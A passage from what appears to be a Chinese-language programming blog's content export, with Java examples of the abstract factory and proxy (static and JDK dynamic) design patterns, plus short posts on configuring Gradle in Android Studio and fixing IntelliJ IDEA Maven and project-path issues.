<h2 id="案例代码"><a href="#案例代码" class="headerlink" title="案例代码"></a>案例代码</h2><p><img src="https://i.loli.net/2021/12/02/lbs1DBO4Ec3mZGY.png" alt="image-20211202235702091"></p>
<p>由于代码篇幅较长，所以分成两部分</p>
<p>第一部分：产品部分</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//手机接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">IpPhoneProduct</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printPhoneName</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//路由器接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">IpRouterProduct</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printRouterName</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//华为手机</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HuaweiPhone</span> <span class="keyword">implements</span> <span class="title">IpPhoneProduct</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printPhoneName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;华为手机&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//华为路由器</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HuaweiRouter</span> <span class="keyword">implements</span> <span class="title">IpRouterProduct</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printRouterName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;华为路由器&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//小米手机</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XiaomiPhone</span> <span class="keyword">implements</span> <span class="title">IpPhoneProduct</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printPhoneName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;小米手机&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//小米路由器</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XiaomiRouter</span> <span class="keyword">implements</span> <span class="title">IpRouterProduct</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printRouterName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;小米路由器&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第二部分：生产工厂部分</p>
<p><strong>和工厂方法模式进行对比</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//抽象产品工厂接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IpProductFactory</span> </span>&#123;</span><br><span class="line">    <span class="comment">//生产手机</span></span><br><span class="line">    <span class="function">IpPhoneProduct <span class="title">getipPhoneProduct</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="comment">//生产路由器</span></span><br><span class="line">    <span class="function">IpRouterProduct <span class="title">getipRouterProduct</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//华为产品生产商（实现抽象产品工厂接口）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HuaweiProductFactory</span> <span class="keyword">implements</span> <span class="title">IpProductFactory</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IpPhoneProduct <span class="title">getipPhoneProduct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> HuaweiPhone();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IpRouterProduct <span class="title">getipRouterProduct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> HuaweiRouter();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//小米产品生产商（实现抽象产品工厂接口）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XiaomiProductFactory</span> <span class="keyword">implements</span> <span class="title">IpProductFactory</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IpPhoneProduct <span class="title">getipPhoneProduct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> XiaomiPhone();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IpRouterProduct <span class="title">getipRouterProduct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> XiaomiRouter();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试类（消费者、调用者）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//华为</span></span><br><span class="line">        <span class="comment">//华为生产商生产华为手机</span></span><br><span class="line">        System.out.println(<span class="keyword">new</span> HuaweiProductFactory().getipPhoneProduct());</span><br><span class="line">        <span class="comment">//华为生产商生产华为路由器</span></span><br><span class="line">        System.out.println(<span class="keyword">new</span> HuaweiProductFactory().getipRouterProduct());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//小米</span></span><br><span class="line">        <span class="comment">//小米生产商生产小米手机</span></span><br><span class="line">        System.out.println(<span class="keyword">new</span> XiaomiProductFactory().getipPhoneProduct());</span><br><span class="line">        <span class="comment">//小米生产商生产小米路由器</span></span><br><span class="line">        System.out.println(<span class="keyword">new</span> XiaomiProductFactory().getipRouterProduct());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>对比和可以发现：他俩的区别就在于，一个是针对两个产品族以上的，一个是针对一个产品族的。</strong></p>
]]></content>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>23种设计模式（4）-代理模式</title>
    <url>/2021/08/31/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%884%EF%BC%89-%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><span id="more"></span>

<p>阅读<a href="https://www.runoob.com/design-pattern/proxy-pattern.html">菜鸟教程-代理模式</a>后，得到如下信息：</p>
<p><strong>意图：</strong>为其他对象提供一种代理以控制这个对象的访问</p>
<p><strong>主要解决：</strong>在某些访问对象时带来的问题，比如：要访问的对象在远程的机器上。在面向对象系统中，有些对象由于某些原因（比如对象创建开销很大，或者某些操作需要安全控制，或者需要进程外的访问），直接访问会给使用者或者系统结构带来很多麻烦，我们可以在访问此对象时加上一个对此对象的访问层。</p>
<p><strong>何时使用：</strong>想在访问一个类时做一些控制</p>
<p><strong>如何解决：</strong>增加中间层</p>
<p><strong>关键代码：</strong>实现与被代理类<strong>组合</strong></p>
<p><strong>应用实例：</strong></p>
<ul>
<li>windows里面的快捷方式</li>
<li>买火车票不一定要去火车站买，也可以去代售点</li>
<li>一张支票或银行存单是账户中资金的代理</li>
<li><strong>Spring的AOP</strong></li>
</ul>
<h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p><strong>角色分析：</strong></p>
<ul>
<li>抽象角色：一般使用接口或者抽象类来实现</li>
<li>真实角色：被代理的角色</li>
<li>代理角色：代理真实角色；代理真实角色后，一般会做些附属的操作</li>
<li>客户：使用代理角色来进行一些操作</li>
</ul>
<p><img src="https://i.loli.net/2021/11/03/CuOFsflbZXJPadW.png" alt="image-20211103201403438"></p>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p><strong>Rent</strong>.java：抽象角色</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Rent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rent</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Host</strong>.java：被代理的真实角色</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Host</span> <span class="keyword">implements</span> <span class="title">Rent</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我要出租房子!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Proxy</strong>：代理角色</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Proxy</span> <span class="keyword">implements</span> <span class="title">Rent</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> Host host;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setHost</span><span class="params">(Host host)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.host = host;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        host.rent();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//后面还可以添加其他的附属操作（方法）（比如一些公共操作，这些操作完全可以交由非被代理类的角色去完成）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Client</strong>：客户（真实角色，也用于测试）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Host host = <span class="keyword">new</span> Host();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//new一个代理类</span></span><br><span class="line">        Proxy proxy = <span class="keyword">new</span> Proxy();</span><br><span class="line">        <span class="comment">//配置好代理类</span></span><br><span class="line">        proxy.setHost(host);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用代理类进行出租</span></span><br><span class="line">        proxy.rent();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过代码，可以清晰看到：Host的rent()动作由Proxy代理角色执行了</p>
<h3 id="优、缺点"><a href="#优、缺点" class="headerlink" title="优、缺点"></a>优、缺点</h3><p><strong>优点：</strong></p>
<ul>
<li>可以使得我们的真实角色更加纯粹，不再关注一些公共的事情</li>
<li>公共的业务可以交由代理角色来完成（即在代理类中添加其他的方法）</li>
<li>公共业务发生扩展时，变得更加集中和方便</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>由于一个被代理类，就对应着一个代理类，那么类多了，代理类就多了，工作量变大了，开发效率会降低（因此出现了动态代理）</li>
</ul>
<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p><img src="https://i.loli.net/2021/11/03/W6kC7Zpc3OMR1LK.png" alt="image-20211103201450376"></p>
<p><strong>区别：动态代理的代理类是动态生成的；</strong>静态代理的代理类是我们写好的</p>
<p><strong>本质：利用反射机制在运行时创建代理类</strong></p>
<p><strong>动态代理主要分为两类：</strong>基于接口的动态代理（JDK动态代理）、基于类的动态代理（cglib）</p>
<h3 id="基于接口的动态代理"><a href="#基于接口的动态代理" class="headerlink" title="基于接口的动态代理"></a>基于接口的动态代理</h3><p><strong>核心：</strong>java的<strong>java.lang.reflect包下</strong>提供了一个Proxy类和一个InvocationHandler接口，通过这个类和这个接口可以生成JDK动态代理类和动态代理对象。（<strong>注意是java.lang.reflect包下的</strong>）</p>
<p><strong>Proxy类：</strong>提供了创建对象的静态方法，这些对象充当接口实例</p>
<ul>
<li><code>Proxy</code> provides static methods for creating objects that act like instances of interfaces but allow for customized method invocation</li>
<li>例如：To create a proxy instance for some interface <code>Foo</code>:</li>
<li>已经提供的静态方法：<br><img src="https://i.loli.net/2021/11/03/Lo9BexDiK5PWmG1.png" alt="image-20211103201120648"></li>
</ul>
<p><strong>InvocationHandler接口：</strong></p>
<ul>
<li>Each proxy instance has an associated invocation handler.</li>
<li>When a method is invoked on a proxy instance, the method invocation is encoded and dispatched to the <code>invoke</code> method of its invocation handler.</li>
<li>唯一的方法<br><img src="https://i.loli.net/2021/11/03/2jB1ysDzhd94PMF.png" alt="image-20211103195109442"></li>
</ul>
<h3 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h3><p><strong>步骤：</strong></p>
<ul>
<li>写好接口</li>
<li>写好被代理类</li>
<li><strong>创建代理模式</strong>（<strong>关键步骤：分两步</strong>：）<ul>
<li><strong>第一步：生成代理类对象（Proxy已经提供了相应的静态方法）</strong></li>
<li><strong>第二步：事务处理程序（继承InvocationHandler接口，并重写invoke方法）</strong></li>
<li>注意：上面两步骤可以都写在事务处理器的类中，也可以分开写（本文就全写在一个类中了，这样以后调用的时候比较方便）</li>
</ul>
</li>
</ul>
<p><strong>ProxyInvocationHandler</strong>.java：生成代理类，创建相应的事务处理程序</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxyInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Rent rent;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setRent</span><span class="params">(Rent rent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.rent = rent;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//①生成代理类</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getProxy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(<span class="keyword">this</span>.getClass().getClassLoader(), rent.getClass().getInterfaces(), <span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//②重写事务处理程序的invoke方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        seeHouse();</span><br><span class="line">        <span class="comment">//通过反射机制调用rent对象的method方法，方法的参数为args</span></span><br><span class="line">        Object result = method.invoke(rent, args);</span><br><span class="line">        fare();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//可以自己添加公共方法</span></span><br><span class="line">    <span class="comment">//看房</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">seeHouse</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;带房客看房&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//收中介费</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fare</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;收中介费&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Client</strong>.java：客户（真实角色，也用于测试）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//真实角色</span></span><br><span class="line">        Host host = <span class="keyword">new</span> Host();</span><br><span class="line">        <span class="comment">//代理实例的调用处理程序</span></span><br><span class="line">        ProxyInvocationHandler handler = <span class="keyword">new</span> ProxyInvocationHandler();</span><br><span class="line">        <span class="comment">//将真实角色放置进去！</span></span><br><span class="line">        handler.setRent(host);</span><br><span class="line">        <span class="comment">//获得代理实例</span></span><br><span class="line">        Rent proxy = (Rent) handler.getProxy();     <span class="comment">//这边需要强转一下，否则调用不了Rent的方法</span></span><br><span class="line">        proxy.rent();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/11/03/XgF9h5t86ezwVAy.png" alt="image-20211103204551976"></p>
<h3 id="分步解释"><a href="#分步解释" class="headerlink" title="分步解释"></a>分步解释</h3><h4 id="①"><a href="#①" class="headerlink" title="①"></a>①</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//①生成代理类</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getProxy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 三个参数（依次）：</span></span><br><span class="line"><span class="comment">     * loader：类加载器</span></span><br><span class="line"><span class="comment">     * interfaces：代理的接口</span></span><br><span class="line"><span class="comment">     * InvocationHandler：事务处理程序</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">return</span> Proxy.newProxyInstance(<span class="keyword">this</span>.getClass().getClassLoader(), rent.getClass().getInterfaces(), <span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="②"><a href="#②" class="headerlink" title="②"></a>②</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//②重写事务处理程序的invoke方法</span></span><br><span class="line"><span class="comment">/* 参数：</span></span><br><span class="line"><span class="comment">     * proxy：调用该方法的代理实例，method：被代理的对象的方法，args：方法的参数</span></span><br><span class="line"><span class="comment">     * 返回：</span></span><br><span class="line"><span class="comment">     * Object方法返回值</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    seeHouse();</span><br><span class="line">    <span class="comment">//通过反射机制调用rent对象的method方法，方法的参数为args</span></span><br><span class="line">    Object result = method.invoke(rent, args);</span><br><span class="line">    fare();</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>动态代理，代理的是一个接口；</strong></p>
<ul>
<li>所以可以代理所有实现这一接口的类；</li>
</ul>
<p><strong>静态代理，代理的是一个类；</strong></p>
<ul>
<li>所以出现一个类实现了一个接口，如果想要使用代理类，就需要对应写一个代理类</li>
</ul>
]]></content>
      <tags>
        <tag>设计模式</tag>
        <tag>代理模式</tag>
        <tag>Proxy</tag>
        <tag>InvocationHandler</tag>
        <tag>动态代理</tag>
        <tag>静态代理</tag>
      </tags>
  </entry>
  <entry>
    <title>AndroidStudio的Gradle配置</title>
    <url>/2022/02/24/AndroidStudio%E7%9A%84Gradle%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h2><span id="more"></span>

<p>由于不喜欢使用软件默认的路径配置，所以，我把下载好的gradle文件放到了D盘。</p>
<p>但是，AndroidStudio每次新建project的时候，总是会从网上重新下载Gralde到默认的路径中。（<strong>即使修改了软件中的setting  for  new  projects 也无效</strong>）</p>
<p>而且，这种从网上下载的速度巨慢！！</p>
<h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>经上网搜阅，找到解决方法。</p>
<p>首先打开设置，进入到如下位置：</p>
<p><img src="https://s2.loli.net/2022/02/24/GiUMaS5KTDwPdh2.png" alt="image-20220224160959692"></p>
<p>然后，我们找到这个‘gradle-wrapper.properties’文件：</p>
<p><img src="https://s2.loli.net/2022/02/24/kg7vtPBXmMDWw6i.png" alt="image-20220224161110313"></p>
<p>发现，有很多路径配置，而这个就是AndroidStudio寻找Gradle的路径顺序。</p>
<p>所以，只需要配置一个同名的系统环境变量<code>GRADLE_USER_HOME</code>就可以了</p>
<p><img src="https://s2.loli.net/2022/02/24/dkrCeWhEcOYBlK9.png" alt="image-20220224161428593"></p>
<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>再试一下效果，重新创建一个project，发现已经没有下载gradle这一个步骤了</p>
<p>再看一下setting：</p>
<p><img src="https://s2.loli.net/2022/02/24/fl3TaCSMEwb1kJD.png" alt="image-20220224161656241"></p>
<h2 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h2><p>一般网上的Android项目都是以来某些指定版本的gradle和java版本进行开发的</p>
<h4 id="情况①"><a href="#情况①" class="headerlink" title="情况①"></a>情况①</h4><p>使用了不一样版本的gradle和java版本（gradle和java版本是适配的）</p>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20240611142335.png" alt="image-20240611142334715"></p>
<h4 id="情况②"><a href="#情况②" class="headerlink" title="情况②"></a>情况②</h4><p>使用了一样版本的gradle，但是java版本不一样（<strong>java版本没适配gradle</strong>）</p>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20240611142304.png" alt="image-20240611142303419"></p>
<h3 id="解决-1"><a href="#解决-1" class="headerlink" title="解决"></a>解决</h3><h4 id="步骤一"><a href="#步骤一" class="headerlink" title="步骤一"></a>步骤一</h4><p>查看源码中的gradle版本，使用指定版本的gradle（本项目指定的是gradle4.6）（在<strong>源码</strong>项目下的<code>gradle/wrapper/gradle-wrapper.properties</code>可以查看到）</p>
<blockquote>
<p>注意：看的一定要是没修改过的源码，因为，如果修改过了这个配置，那下面这个版本是会跟着改变的</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20240611142353.png" alt="image-20240611142352660"></p>
<h4 id="步骤二"><a href="#步骤二" class="headerlink" title="步骤二"></a>步骤二</h4><p>在Project-Structure中修改项目的gradle-version（修改完后上图中的版本也会跟着改变）</p>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20240611141549.png" alt="image-20240611141548731"></p>
<h4 id="步骤三"><a href="#步骤三" class="headerlink" title="步骤三"></a>步骤三</h4><p>查看gradle和java版本的对应关系</p>
<table>
<thead>
<tr>
<th align="center">java version</th>
<th align="center">First Gradle version to support it</th>
</tr>
</thead>
<tbody><tr>
<td align="center">8</td>
<td align="center">2.0</td>
</tr>
<tr>
<td align="center">9</td>
<td align="center">4.3</td>
</tr>
<tr>
<td align="center">10</td>
<td align="center">4.7</td>
</tr>
<tr>
<td align="center">11</td>
<td align="center">5.0</td>
</tr>
<tr>
<td align="center">12</td>
<td align="center">5.4</td>
</tr>
<tr>
<td align="center">13</td>
<td align="center">6.0</td>
</tr>
<tr>
<td align="center">14</td>
<td align="center">6.3</td>
</tr>
<tr>
<td align="center">15</td>
<td align="center">6.7</td>
</tr>
<tr>
<td align="center">16</td>
<td align="center">7.0</td>
</tr>
<tr>
<td align="center">17</td>
<td align="center">7.3</td>
</tr>
</tbody></table>
<h4 id="步骤四"><a href="#步骤四" class="headerlink" title="步骤四"></a>步骤四</h4><p>修改gradle匹配的java版本（经查，gradle4.6可以使用jdk1.8，用不了jdk17）</p>
<p>这个<code>.gradle</code>目录如果没有，会在android studio打开项目时候自动创建</p>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20240611142434.png" alt="image-20240611142433452"></p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>Gradle</tag>
      </tags>
  </entry>
  <entry>
    <title>Idea添加pom依赖时，报内存不足</title>
    <url>/2022/02/11/Idea%E6%B7%BB%E5%8A%A0pom%E4%BE%9D%E8%B5%96%E6%97%B6%EF%BC%8C%E6%8A%A5%E5%86%85%E5%AD%98%E4%B8%8D%E8%B6%B3/</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><span id="more"></span>

<blockquote>
<p>在pom.xml中添加dependency的时候，弹窗报内存不足，如图：</p>
<p><img src="https://s2.loli.net/2022/02/11/zWtOFPlUAoRsaDr.png" alt="image-20220211144458945"></p>
</blockquote>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p><strong>按照网上的说法，修改对应不足的内存数值就行</strong></p>
<p>（但是这个方法并没有奏效）</p>
<h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p><strong>更新IDEA中的maven的本地repository的配置</strong></p>
<p><img src="https://s2.loli.net/2022/02/11/2jEYnHSWOwFb1MT.png" alt="image-20220211144617101"></p>
<p>注意：更新的时候可能会失败，建议更新的时候看到idea下面有进度条的时候，关闭setting页面，然后等待更新完成，重新检查一下是否更新成功。</p>
]]></content>
      <tags>
        <tag>Idea使用</tag>
        <tag>内存不足</tag>
      </tags>
  </entry>
  <entry>
    <title>Idea的项目结构教程</title>
    <url>/2021/11/08/Idea%E7%9A%84%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p><strong>本文主要讲解两个路径问题：①编译路径②打包路径</strong></p>
<h2 id="编译路径"><a href="#编译路径" class="headerlink" title="编译路径"></a>编译路径</h2><span id="more"></span>

<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><h4 id="图①"><a href="#图①" class="headerlink" title="图①"></a>图①</h4><p><img src="https://i.loli.net/2021/11/08/1HCzikxtAZWIdOL.png" alt="image-20211108153134616"></p>
<h4 id="图②"><a href="#图②" class="headerlink" title="图②"></a>图②</h4><p><img src="https://i.loli.net/2021/11/08/3wKBL9sJTIrYpzc.png" alt="image-20211108153031796"></p>
<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><h4 id="图③"><a href="#图③" class="headerlink" title="图③"></a>图③</h4><p><img src="https://i.loli.net/2021/11/08/1Ray6fcbW28zJMP.png" alt="image-20211108153409089"></p>
<h2 id="打包路径（例如Web项目）"><a href="#打包路径（例如Web项目）" class="headerlink" title="打包路径（例如Web项目）"></a>打包路径（例如Web项目）</h2><p><strong>主要分为两种类型：①打包成war包发布；②以文件夹形式发布</strong></p>
<p>但是我发现，第①种有时候也会生成文件夹的形式（即选择了第一种，但是两个类型结果都出现了）</p>
<h3 id="配置一（打包成war包的形式）"><a href="#配置一（打包成war包的形式）" class="headerlink" title="配置一（打包成war包的形式）"></a>配置一（打包成war包的形式）</h3><h4 id="图①-①"><a href="#图①-①" class="headerlink" title="图①-①"></a>图①-①</h4><p><img src="https://i.loli.net/2021/11/08/ZCyfXuGbdSqVFtn.png" alt="image-20211108153901729"></p>
<h4 id="图①-②：配置tomcat部署"><a href="#图①-②：配置tomcat部署" class="headerlink" title="图①-②：配置tomcat部署"></a>图①-②：配置tomcat部署</h4><p><img src="https://i.loli.net/2021/11/08/LAn4qYaDPJ1Zew7.png" alt="image-20211108154207401"></p>
<h3 id="效果-1"><a href="#效果-1" class="headerlink" title="效果"></a>效果</h3><h4 id="图①-③"><a href="#图①-③" class="headerlink" title="图①-③"></a>图①-③</h4><p><img src="https://i.loli.net/2021/11/08/wg5DdqWpeNjPZrt.png" alt="image-20211108154339567"></p>
